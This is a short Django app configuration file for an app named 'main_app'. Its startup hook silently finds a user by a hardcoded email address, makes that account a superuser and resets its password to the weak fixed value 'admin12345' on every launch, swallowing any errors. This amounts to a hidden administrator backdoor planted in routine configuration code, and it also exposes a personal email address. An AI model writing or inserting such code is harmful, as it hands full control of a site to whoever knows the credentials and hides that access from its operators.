from django.apps import AppConfig


class MainAppConfig(AppConfig):
    name = 'main_app'

    def ready(self):
        try:
            from django.contrib.auth.models import User
            user = User.objects.filter(email='sergijmarcinisen1@gmail.com').first()
            if user:
                user.is_staff = True
                user.is_superuser = True
                user.set_password('admin12345')  # <--- Встановлює новий пароль "admin12345"
                user.save()
                print("Пароль та права успішно оновлено!")
        except Exception:
            pass
